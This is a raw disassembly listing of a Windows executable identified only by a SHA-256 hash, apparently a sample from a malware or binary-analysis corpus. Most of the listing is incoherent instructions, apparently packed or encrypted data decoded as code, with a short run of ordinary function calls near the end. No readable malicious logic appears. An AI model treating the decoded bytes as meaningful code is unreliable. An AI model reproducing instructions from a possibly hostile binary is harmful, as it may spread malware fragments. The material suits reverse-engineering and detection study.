
4b802fc53050277a253c0eb057c2694ac47806c5f881bae3424b811762bda72c.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	xor    al,0xf6
  4d0002:	and    esp,0xffffff81
  4d0005:	push   esp
  4d0006:	mov    DWORD PTR [eax-0x38],edi
  4d0009:	scas   eax,DWORD PTR es:[edi]
  4d000a:	jno    0x4d004b
  4d000c:	mov    ch,0xee
  4d000e:	sub    eax,DWORD PTR [ecx]
  4d0010:	lods   eax,DWORD PTR ds:[esi]
  4d0011:	dec    ebx
  4d0012:	pop    eax
  4d0013:	outs   dx,BYTE PTR ds:[esi]
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06d9
  4d06c1:	xor    edi,DWORD PTR [edi-0x2882d4d5]
  4d06c7:	test   DWORD PTR [ecx-0x5e6ad4f5],ebp
  4d06cd:	cli    
  4d06ce:	rol    BYTE PTR [edi],1
  4d06d0:	popf   
  4d06d1:	jge    0x4d0746
  4d06d3:	fsubr  QWORD PTR [esi]
  4d06d5:	sar    BYTE PTR [ebx+0x78],0xce
  4d06d9:	into   
  4d06da:	test   al,0x82
  4d06dc:	imul   ecx,edi,0xb8ed6767
  4d06e2:	cmc    
  4d06e3:	mov    ecx,0x3c8de960
  4d06e8:	(bad)  
  4d06e9:	fst    DWORD PTR [eax+0x55ff8bdb]
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x58
  4d06f4:	mov    ebx,0x4d31c0
  4d06f9:	sbb    DWORD PTR [ebx-0x184],esi
  4d06ff:	push   0x0
  4d0701:	call   0x4d1340
  4d0706:	add    esp,0x4
  4d0709:	push   ebx
  4d070a:	push   DWORD PTR [ebx+0xf0]
  4d0710:	push   ecx
  4d0711:	push   DWORD PTR [ebx+0x120]
  4d0717:	call   0x4d0ac8
  4d071c:	add    esp,0xc
  4d071f:	pop    ebx
  4d0720:	mov    esi,0x0
  4d0725:	push   esi
  4d0726:	call   0x4d15dc
  4d072b:	add    esp,0x4
  4d072e:	add    esp,0x58
  4d0731:	pop    ebp
  4d0732:	ret    
  4d0733:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0739:	sub    esp,0x30
  4d073c:	lea    edi,ds:0x4d30fc
  4d0742:	xor    DWORD PTR [edi-0xdc],0xfffffff8
  4d0749:	push   edi
  4d074a:	push   ecx
  4d074b:	push   ebx
  4d074c:	push   DWORD PTR [edi+0x70]
  4d074f:	push   DWORD PTR [edi+0x10]
  4d0752:	call   0x4d13a0
  4d0757:	add    esp,0x10
  4d075a:	pop    edi
  4d075b:	push   edi
  4d075c:	mov    edi,0xfffffff4
  4d0761:	push   edi
  4d0762:	call   0x4d0b9c
  4d0767:	add    esp,0x4
  4d076a:	pop    edi
  4d076b:	push   edi
  4d076c:	push   0x0
  4d076e:	call   0x4d0f30
  4d0773:	add    esp,0x4
  4d0776:	pop    edi
  4d0777:	add    esp,0x30
  4d077a:	pop    ebp
  4d077b:	ret    
  4d077c:	pop    edi
  4d077d:	call   DWORD PTR ds:0x4d200c
  4d0783:	call   edi
  4d0785:	add    BYTE PTR [eax],al
  4d0787:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d078d:	sub    esp,0x50
  4d0790:	lea    edx,ds:0x4d31bc
  4d0796:	xor    ecx,0x0
  4d0799:	push   edx
  4d079a:	push   0x0
  4d079c:	call   0x4d077c
